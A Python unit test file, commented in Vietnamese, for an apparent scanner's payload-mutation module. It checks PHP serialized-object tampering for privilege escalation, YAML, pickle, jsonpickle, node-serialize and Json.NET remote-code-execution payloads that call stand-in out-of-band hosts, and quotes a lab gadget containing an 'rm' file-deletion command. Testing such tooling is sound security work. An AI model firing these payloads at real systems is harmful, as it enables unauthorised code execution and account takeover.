"""
Unit test cho Analyze/payloadMutation.py — tap trung vao 3 ham mutate PHP
(flip_boolean/modify_string/modify_integer) va bo parser PHP serialize
(_read_php_token/_iter_php_pairs) vua duoc viet lai de fix cac bug:
  1. __modify_string() dam nham KEY (ten field) voi VALUE (gia tri) trong
     cau truc xen ke s:N:"KEY";VALUE;s:N:"KEY2";VALUE2;... cua PHP serialize.
  2. Regex s:(\\d+):"([^"]+)" bi cat ngan khi VALUE chua dau ngoac kep ben
     trong (hop le vi PHP serialize length-prefixed, khong can escape).
  3. __flip_boolean() dung .replace() khong neo vi tri, co the sua nham noi
     dung string khong lien quan chua trung substring "b:0"/"b:1", va doi
     TAT CA field boolean cung luc thay vi tach rieng tung field.
"""

import base64
import sys
import os
import unittest
from unittest.mock import patch

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from Analyze.payloadMutation import PayloadMutation


def mutate(payload: str, probe: str, exploit_type: str = "x") -> list:
    exploit = {"suggested_probe": probe, "exploit_type": exploit_type}
    vector = {"value": payload, "location": "cookie", "name": "session", "url": "http://x/", "method": "GET"}
    return PayloadMutation(exploit, vector).mutate()


def decoded_payloads(results: list) -> list:
    return [base64.b64decode(r["payload"]).decode() for r in results]


class TestModifyStringTargetsValuesNotKeys(unittest.TestCase):
    """Regression: __modify_string() phai chi doi VALUE, khong bao gio dung
    vao KEY (ten field) - truoc fix, payload that tu result1.json sinh ra
    7/11 mutation sai (doi ten field thay vi gia tri)."""

    REAL_PORTSWIGGER_PAYLOAD = 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}'

    def test_only_mutates_the_value_wiener_not_the_key_username(self):
        results = mutate(self.REAL_PORTSWIGGER_PAYLOAD, "modify_string", "Identity Spoofing")
        payloads = decoded_payloads(results)
        for p in payloads:
            self.assertIn('s:8:"username"', p, "Ten field 'username' khong duoc bi doi")
        self.assertTrue(any('"administrator"' in p and 's:8:"username";s:13:"administrator"' in p for p in payloads))

    def test_exact_mutation_count_is_four_not_eleven(self):
        results = mutate(self.REAL_PORTSWIGGER_PAYLOAD, "modify_string", "Identity Spoofing")
        self.assertEqual(len(results), 4)

    def test_embedded_quote_inside_string_value_does_not_break_parsing(self):
        inner = 'a"b"c"d"e'
        payload = f'a:1:{{s:8:"username";s:{len(inner)}:"{inner}";}}'
        results = mutate(payload, "modify_string")
        payloads = decoded_payloads(results)
        self.assertEqual(len(payloads), 4)
        for p in payloads:
            self.assertTrue(p.endswith(";}"), f"Payload hong cu phap: {p!r}")
            self.assertNotIn('"c"d"e"', p)

    def test_nested_object_with_no_matching_field_produces_no_mutation(self):
        payload = ('O:14:"CustomTemplate":2:{s:17:"default_desc_type";'
                   's:26:"rm /home/carlos/morale.txt";s:4:"desc";'
                   'O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}')
        results = mutate(payload, "modify_string")
        self.assertEqual(results, [])

    def test_nested_object_field_is_now_recursed_into_and_mutated(self):
        payload = ('O:4:"User":1:{s:7:"profile";'
                   'O:7:"Profile":1:{s:4:"role";s:4:"user";}}')
        results = mutate(payload, "modify_string")
        mutated = decoded_payloads(results)
        self.assertEqual(len(mutated), 4)
        for p in mutated:
            self.assertIn('s:7:"profile"', p)
            self.assertNotIn('s:4:"user"', p)

    def test_key_name_containing_hint_word_is_not_itself_mutated(self):
        results = mutate(self.REAL_PORTSWIGGER_PAYLOAD, "modify_string", "Identity Spoofing")
        for p in decoded_payloads(results):
            self.assertTrue(p.startswith('O:4:"User":2:{s:8:"username";'),
                             "Key 'username' bi doi ten - regression cua bug dam key/value")


class TestFlipBooleanIsolatesEachField(unittest.TestCase):
    """Regression: __flip_boolean() phai (1) khong dung vao noi dung string
    khong lien quan, (2) sinh 1 mutation RIENG cho MOI field boolean thay vi
    doi tat ca cung luc."""

    def test_two_boolean_fields_produce_two_isolated_mutations(self):
        payload = ('O:4:"User":3:{s:8:"username";s:6:"wiener";'
                   's:8:"is_admin";b:0;s:9:"is_active";b:0;}')
        results = mutate(payload, "flip_boolean")
        payloads = decoded_payloads(results)
        self.assertEqual(len(payloads), 2)
        self.assertIn('s:8:"is_admin";b:1;s:9:"is_active";b:0;', "".join(p for p in payloads if "b:1;s:9" in p))
        self.assertTrue(any('is_admin";b:1;s:9:"is_active";b:0' in p for p in payloads))
        self.assertTrue(any('is_admin";b:0;s:9:"is_active";b:1' in p for p in payloads))

    def test_string_value_containing_b0_substring_is_not_corrupted(self):
        text = 'comment=b:0 is code'
        payload = f'a:2:{{s:7:"comment";s:{len(text)}:"{text}";s:9:"is_active";b:0;}}'
        results = mutate(payload, "flip_boolean")
        payloads = decoded_payloads(results)
        self.assertEqual(len(payloads), 1)
        self.assertIn(f's:{len(text)}:"{text}"', payloads[0],
                       "Noi dung string khong lien quan bi sua nham - regression cua bug replace khong neo vi tri")
        self.assertIn('is_active";b:1', payloads[0])

    def test_single_boolean_field_still_flips(self):
        payload = 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}'
        results = mutate(payload, "flip_boolean")
        payloads = decoded_payloads(results)
        self.assertEqual(len(payloads), 1)
        self.assertTrue(payloads[0].endswith('b:1;}'))

    def test_boolean_field_nested_inside_object_is_now_found_and_flipped(self):
        payload = ('O:4:"User":1:{s:7:"profile";'
                   'O:7:"Profile":1:{s:5:"admin";b:0;}}')
        results = mutate(payload, "flip_boolean")
        payloads = decoded_payloads(results)
        self.assertEqual(len(payloads), 1)
        self.assertIn('s:7:"profile"', payloads[0])
        self.assertTrue(payloads[0].endswith('"admin";b:1;}}'))


class TestModifyIntegerUsesPositionalReplace(unittest.TestCase):
    def test_two_fields_with_same_integer_value_mutated_independently(self):
        payload = 'a:2:{s:5:"level";i:5;s:5:"score";i:5;}'
        results = mutate(payload, "modify_integer")
        payloads = decoded_payloads(results)
        self.assertEqual(len(payloads), 10)
        for p in payloads:
            self.assertEqual(p.count("i:5;"), 1, f"Phai con dung 1 vi tri i:5; chua doi: {p!r}")

    def test_integer_field_nested_inside_object_is_now_found_and_mutated(self):
        payload = ('O:4:"User":1:{s:7:"profile";'
                   'O:7:"Profile":1:{s:5:"level";i:1;}}')
        results = mutate(payload, "modify_integer")
        payloads = decoded_payloads(results)
        self.assertEqual(len(payloads), 4)
        for p in payloads:
            self.assertIn('s:7:"profile"', p)
            self.assertNotIn("i:1;", p)


class TestJavaChainMapAndExceptionHandling(unittest.TestCase):
    def test_rome_gadget_maps_to_real_ysoserial_chain(self):
        pm = PayloadMutation({"suggested_probe": "ysoserial", "exploit_type": "Rome Gadget"},
                              {"value": "x", "location": "c", "name": "n", "url": "u", "method": "GET"})
        self.assertEqual(pm._resolve_chains(), ["ROME"])


class TestYamlMutationRespectsJavaVsPython(unittest.TestCase):
    """Regression: _mutate_yaml() phai doc self.etype de phan biet SnakeYAML
    (Java) voi PyYAML (Python) - truoc fix, ca 2 deu nhan chung 1 payload
    Python ("!!python/object/apply:os.system"), vo dung voi target Java that
    (SnakeYAML khong hieu cu phap Python)."""

    def test_java_exploit_type_gets_snakeyaml_payload_not_python(self):
        results = mutate("!!javax.script.ScriptEngineManager [...]", "yaml_exec", "YAML Java ScriptEngine")
        self.assertEqual(len(results), 1)
        payload = decoded_payloads(results)[0]
        self.assertIn("javax.script.ScriptEngineManager", payload)
        self.assertIn("java.net.URLClassLoader", payload)
        self.assertNotIn("!!python/", payload, "Khong duoc gui cu phap Python cho target Java")

    def test_python_exploit_type_still_gets_python_payload(self):
        import tool_config
        tool_config.set_oob_override("oob.test.local")
        try:
            results = mutate("!!python/object/apply:os.system ['id']", "yaml_exec", "YAML Python RCE")
        finally:
            tool_config.set_oob_override(None)
        rce = [r for r in results if r.get("type") == "yaml_rce"]
        self.assertEqual(len(rce), 3)
        for payload in decoded_payloads(rce):
            self.assertIn("!!python/object/apply:os.system", payload)
        oob = [r for r in results if r.get("type") == "yaml_oob"]
        self.assertEqual(len(oob), 1)
        self.assertIn("urllib.request.urlopen", decoded_payloads(oob)[0])
        self.assertIn("oob.test.local", decoded_payloads(oob)[0])

    def test_java_class_injection_subtype_also_routes_to_java_payload(self):
        results = mutate("!!java.lang.Runtime [...]", "yaml_exec", "YAML Java Class")
        payload = decoded_payloads(results)[0]
        self.assertIn("javax.script.ScriptEngineManager", payload)


class TestJavaRceEscalation(unittest.TestCase):
    """_mutate_java_rce_escalation(): khi khong tim thay keyword gadget cu the
    nao ("Unknown Gadget"), tool phai TU DONG thu them cac gadget chain pho
    bien (khong chi dung lai o URLDNS probe) - nhung dung lenh goi ra OOB
    domain (khong dung id/whoami/hostname, vi server khong echo stdout ve nen
    tool khong doc duoc ket qua qua response HTTP)."""

    def _pm(self):
        return PayloadMutation(
            {"suggested_probe": "urldns_probe", "exploit_type": "Java Deserialization — Unknown Gadget"},
            {"value": "x", "location": "cookie", "name": "session", "url": "http://x/", "method": "GET"},
        )

    @patch("Analyze.payloadMutation.get_oob_domain", return_value="")
    def test_no_oob_domain_configured_returns_nothing(self, _mock):
        pm = self._pm()
        self.assertEqual(pm._mutate_java_rce_escalation(), [])

    @patch("Analyze.payloadMutation.get_oob_domain", return_value="test123.oast.fun")
    def test_missing_ysoserial_jar_returns_nothing(self, _mock):
        pm = self._pm()
        pm.YSOSERIAL_PATH = "tools/java/this-file-does-not-exist.jar"
        self.assertEqual(pm._mutate_java_rce_escalation(), [])

    @patch("Analyze.payloadMutation.get_oob_domain", return_value="test123.oast.fun")
    def test_commands_use_oob_domain_not_benign_test_commands(self, _mock):
        pm = self._pm()
        commands = [c.format(domain="test123.oast.fun") for c in pm.RCE_ESCALATION_OOB_COMMANDS]
        for cmd in commands:
            self.assertIn("test123.oast.fun", cmd)
        for benign in ("id", "whoami", "hostname"):
            self.assertNotEqual(commands, benign, "Escalation phai dung lenh OOB, khong dung lenh cau tra loi qua stdout")

    @patch("Analyze.payloadMutation.get_oob_domain", return_value="")
    def test_mutate_dispatch_calls_both_urldns_and_escalation(self, _mock):
        pm = self._pm()
        pm.YSOSERIAL_PATH = "tools/java/this-file-does-not-exist.jar"
        with patch.object(pm, "_mutate_java_urldns", wraps=pm._mutate_java_urldns) as spy_urldns, \
             patch.object(pm, "_mutate_java_rce_escalation", wraps=pm._mutate_java_rce_escalation) as spy_escalate:
            pm.mutate()
            spy_urldns.assert_called_once()
            spy_escalate.assert_called_once()


class TestPhpTypeJuggling(unittest.TestCase):
    """PortSwigger 'Modifying serialized data types': winning payload needs a STRING
    field (access_token) turned into integer 0 (PHP loose-compare bypass) together with
    username -> administrator. modify_string never changes the TYPE, so __type_juggle
    was added."""

    LAB = ('O:4:"User":2:{s:8:"username";s:6:"wiener";'
           's:12:"access_token";s:32:"qstozslgs4qxcxatc371ib4vkp7d0fw5";}')

    def test_generates_the_exact_lab_solution_payload(self):
        payloads = decoded_payloads(mutate(self.LAB, "modify_string", "Privilege Escalation"))
        self.assertIn(
            'O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}',
            payloads,
            "Combined privesc payload (username=administrator + access_token=i:0) phai duoc sinh ra",
        )

    def test_token_field_alone_juggled_to_integer_zero(self):
        payloads = decoded_payloads(mutate(self.LAB, "modify_string", "Privilege Escalation"))
        self.assertIn(
            'O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";i:0;}',
            payloads,
        )

    def test_no_type_juggle_on_gadget_chain_without_token_field(self):
        payload = ('O:14:"CustomTemplate":2:{s:17:"default_desc_type";'
                   's:26:"rm /home/carlos/morale.txt";s:4:"desc";'
                   'O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}')
        results = mutate(payload, "modify_string")
        self.assertFalse(any(r["type"].startswith("type_juggle") for r in results))


class TestPythonBlindOobVariants(unittest.TestCase):
    """The pickle/YAML Python probes gain a blind-confirmation variant that makes the
    target call the OOB collector (urllib) — for sinks whose result never shows in the
    response. Only emitted when an OOB domain is configured."""

    def test_pickle_exec_adds_oob_callback_variant(self):
        import tool_config
        tool_config.set_oob_override("oob.test.local/tok1")
        try:
            results = mutate("gASV...", "pickle_exec", "Python Pickle")
        finally:
            tool_config.set_oob_override(None)
        oob = [r for r in results if r.get("type") == "pickle_oob"]
        self.assertEqual(len(oob), 1)
        raw = base64.b64decode(oob[0]["payload"])
        self.assertIn(b"urllib.request", raw)
        self.assertIn(b"http://oob.test.local/tok1/", raw)

    def test_no_oob_variant_when_oob_not_configured(self):
        with patch("Analyze.payloadMutation.get_oob_domain", return_value=""):
            results = mutate("gASV...", "pickle_exec", "Python Pickle")
        self.assertFalse(any(r.get("type") == "pickle_oob" for r in results))


class TestJsonpickleMutations(unittest.TestCase):
    """jsonpickle sinks must get JSON py/reduce payloads, NOT binary pickle (which only
    makes jsonpickle.decode() crash on utf-8). Verified: py/reduce os.system runs on the
    live sink."""

    def test_jsonpickle_exec_emits_json_py_reduce(self):
        with patch("Analyze.payloadMutation.get_oob_domain", return_value=""):
            results = mutate('{"py/object":"x"}', "jsonpickle_exec", "jsonpickle Object Injection RCE")
        self.assertEqual([r["type"] for r in results], ["jsonpickle_rce"] * 3)
        for payload in decoded_payloads(results):
            self.assertIn('"py/reduce"', payload)
            self.assertIn("os.system", payload)
            self.assertNotIn("gASV", payload)

    def test_jsonpickle_exec_adds_oob_variant_when_configured(self):
        import tool_config
        tool_config.set_oob_override("oob.test.local/tk")
        try:
            results = mutate('{"py/object":"x"}', "jsonpickle_exec", "jsonpickle Object Injection RCE")
        finally:
            tool_config.set_oob_override(None)
        oob = [r for r in results if r.get("type") == "jsonpickle_oob"]
        self.assertEqual(len(oob), 1)
        raw = decoded_payloads(oob)[0]
        self.assertIn("urllib.request.urlopen", raw)
        self.assertIn("oob.test.local/tk", raw)


class TestNodeBlindOobVariant(unittest.TestCase):
    """node_serialize gains a blind-confirmation variant: a node-serialize IIFE that makes
    the target perform an outbound HTTP GET to the OOB collector (pure 'http' module, no
    shell). This is the only confirmation signal for the blind /api/import-async sink whose
    response never reflects the result. Only emitted when an OOB domain is configured."""

    def test_node_serialize_adds_oob_callback_variant(self):
        import tool_config
        tool_config.set_oob_override("oob.test.local/ndtok")
        try:
            results = mutate('{"x":"_$$ND_FUNC$$_function(){return 1;}"}', "node_serialize", "node-serialize RCE")
        finally:
            tool_config.set_oob_override(None)
        rce = [r for r in results if r.get("type") == "node_serialize_rce"]
        self.assertEqual(len(rce), 3, "van phai giu 3 bien the lenh local (id/whoami/hostname)")
        oob = [r for r in results if r.get("type") == "node_serialize_oob"]
        self.assertEqual(len(oob), 1)
        raw = decoded_payloads(oob)[0]
        self.assertIn("_$$ND_FUNC$$_", raw)
        self.assertIn("require('http').get(", raw)
        self.assertIn("http://oob.test.local/ndtok/", raw)

    def test_no_node_oob_variant_when_oob_not_configured(self):
        with patch("Analyze.payloadMutation.get_oob_domain", return_value=""):
            results = mutate('{"x":"_$$ND_FUNC$$_function(){return 1;}"}', "node_serialize", "node-serialize RCE")
        self.assertFalse(any(r.get("type") == "node_serialize_oob" for r in results))
        self.assertEqual(len([r for r in results if r.get("type") == "node_serialize_rce"]), 3)

    def test_bare_marker_candidate_emits_bare_marker_payloads(self):
        # Real-scan case: scanner narrows the body to the sink field's VALUE, a BARE marker
        # ("_$$ND_FUNC$$_function(){return 1;}"). rebuild() drops our payload into that slot,
        # so payloads MUST be bare markers (NOT wrapped in {"rce":...}) or node-serialize never
        # eval()s them. This is the fix for the Node OOB-never-confirms bug.
        import tool_config
        tool_config.set_oob_override("oob.test.local/baretok")
        try:
            results = mutate("_$$ND_FUNC$$_function(){return 1;}", "node_serialize", "node-serialize RCE")
        finally:
            tool_config.set_oob_override(None)
        for r in [x for x in results if x.get("type") == "node_serialize_rce"]:
            raw = base64.b64decode(r["payload"]).decode()
            self.assertTrue(raw.startswith("_$$ND_FUNC$$_"), f"RCE payload phai la marker tran, khong boc: {raw}")
            self.assertNotIn('{"rce"', raw)
        oob = [r for r in results if r.get("type") == "node_serialize_oob"]
        self.assertEqual(len(oob), 1)
        raw = decoded_payloads(oob)[0]
        self.assertTrue(raw.startswith("_$$ND_FUNC$$_"), f"OOB payload phai la marker tran: {raw}")
        self.assertIn("require('http').get(", raw)
        self.assertIn("oob.test.local/baretok", raw)

    def test_whole_object_candidate_keeps_wrapper_shape(self):
        # When the candidate IS a whole serialized object (e.g. a node-serialize cookie), the
        # payload must stay wrapped so the object carries an eval-able field.
        import tool_config
        tool_config.set_oob_override("oob.test.local/wraptok")
        try:
            results = mutate('{"username":"wiener","admin":false}', "node_serialize", "node-serialize RCE")
        finally:
            tool_config.set_oob_override(None)
        oob = [r for r in results if r.get("type") == "node_serialize_oob"]
        self.assertEqual(len(oob), 1)
        raw = decoded_payloads(oob)[0]
        self.assertTrue(raw.startswith('{"oob"'), f"candidate object -> payload phai boc: {raw}")
        self.assertIn("_$$ND_FUNC$$_", raw)

    def test_proto_pollution_probe_gets_no_oob_canary(self):
        import tool_config
        tool_config.set_oob_override("oob.test.local/ptok")
        try:
            results = mutate('{"theme":"dark"}', "proto_pollution", "Prototype Pollution")
        finally:
            tool_config.set_oob_override(None)
        self.assertFalse(any(r.get("type") == "node_serialize_oob" for r in results),
                         "proto-pollution khong phai primitive goi-ve-nha, khong duoc sinh canary OOB")

    def test_proto_payload_preserves_benign_fields(self):
        # Must inject __proto__ WHILE keeping the original benign keys, so baseline vs mutated differ
        # only in the dangerous element (apples-to-apples). Otherwise a bare {"__proto__":...} body
        # drops theme/lang and the server's benign reshape fools the content-diff oracle into strong.
        import json
        results = mutate('{"theme":"dark","lang":"en","__proto__":{"note":"demo"}}', "proto_pollution", "Prototype Pollution")
        p = [r for r in results if r.get("type") == "prototype_pollution"][0]
        raw = base64.b64decode(p["payload"]).decode()
        obj = json.loads(raw)
        self.assertEqual(obj.get("theme"), "dark")   # benign field kept
        self.assertEqual(obj.get("lang"), "en")      # benign field kept
        self.assertEqual(obj.get("__proto__"), {"isAdmin": True, "polluted": True})  # dangerous swap

    def test_proto_payload_falls_back_when_slot_not_json_object(self):
        results = mutate("not-a-json-object", "proto_pollution", "Prototype Pollution")
        p = [r for r in results if r.get("type") == "prototype_pollution"][0]
        raw = base64.b64decode(p["payload"]).decode()
        self.assertIn("__proto__", raw)
        self.assertIn("isAdmin", raw)


class TestDotnetBlindOobVariant(unittest.TestCase):
    """.NET gains a blind-confirmation variant (Json.NET $type gadget whose command fetches the OOB
    collector), mirroring Java/Node — so a blind .NET sink can be confirmed via callback. Only emitted
    when an OOB domain is configured; local id/whoami commands alone can never confirm out-of-band."""

    def test_jsonnet_adds_oob_callback_variant(self):
        import tool_config
        tool_config.set_oob_override("oob.test.local/dntok")
        try:
            results = mutate('{"$type":"System.Object, mscorlib"}', "jsonnet", "JSON.NET TypeNameHandling RCE")
        finally:
            tool_config.set_oob_override(None)
        oob = [r for r in results if r.get("type") == "dotnet_jsonnet_oob"]
        self.assertEqual(len(oob), 1)
        raw = decoded_payloads(oob)[0]
        self.assertIn("http://oob.test.local/dntok/", raw)
        self.assertIn("ObjectDataProvider", raw)

    def test_no_dotnet_oob_when_not_configured(self):
        with patch("Analyze.payloadMutation.get_oob_domain", return_value=""):
            results = mutate('{"$type":"System.Object, mscorlib"}', "jsonnet", "JSON.NET TypeNameHandling RCE")
        self.assertFalse(any(r.get("type", "").startswith("dotnet_") and r.get("type", "").endswith("_oob") for r in results))


if __name__ == "__main__":
    unittest.main(verbosity=2)
